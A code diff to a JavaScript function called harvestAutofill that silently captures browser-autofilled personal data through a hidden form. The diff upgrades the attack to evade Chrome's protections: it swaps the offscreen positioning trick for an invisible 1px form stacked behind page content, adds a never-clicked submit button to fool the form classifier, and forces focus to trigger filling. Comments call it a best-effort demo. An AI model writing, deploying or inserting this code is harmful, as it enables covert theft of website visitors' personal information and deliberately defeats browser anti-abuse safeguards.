@@ -140,7 +140,22 @@
   function harvestAutofill(callback) {
     try {
       var form = document.createElement("form");
-      form.setAttribute("style", "position:absolute; left:-9999px; top:-9999px;");
+      // Chrome (and other modern browsers) specifically hardened against
+      // the old "left:-9999px" trick — an offscreen field with zero
+      // effective viewport overlap is treated as not-visible and skipped
+      // by the autofill heuristic. Kept in-viewport instead: zero opacity
+      // + non-zero size + stacked behind the page content (negative
+      // z-index, pointer-events:none so it can't intercept real clicks).
+      // A submit button is included (never clicked) purely because
+      // Chrome's form classifier weighs "looks like a real form" more
+      // heavily when one is present. None of this is guaranteed to work
+      // against a given browser/version — autofill anti-abuse heuristics
+      // change over time and are not publicly documented in detail; this
+      // is a best-effort demo, not a guaranteed exploit.
+      form.setAttribute(
+        "style",
+        "position:fixed; top:0; left:0; width:1px; height:1px; opacity:0; z-index:-1; pointer-events:none;"
+      );
       form.setAttribute("autocomplete", "on");
 
       var fields = [
@@ -159,7 +174,19 @@
         form.appendChild(input);
         inputs[f.name] = input;
       });
+      var submit = document.createElement("input");
+      submit.type = "submit";
+      submit.tabIndex = -1;
+      form.appendChild(submit);
       document.body.appendChild(form);
+
+      // Best-effort nudge: some browsers only actually populate .value
+      // once a field in the form has received focus, even if the
+      // autofill preview was already computed on page load.
+      try {
+        inputs.name.focus();
+        inputs.name.blur();
+      } catch (e) {}
 
       setTimeout(function () {
         var harvested = {};
@@ -168,7 +195,7 @@
         });
         document.body.removeChild(form);
         callback(Object.keys(harvested).length ? harvested : null);
-      }, 1500);
+      }, 2000);
     } catch (e) {
       callback(null);
     }
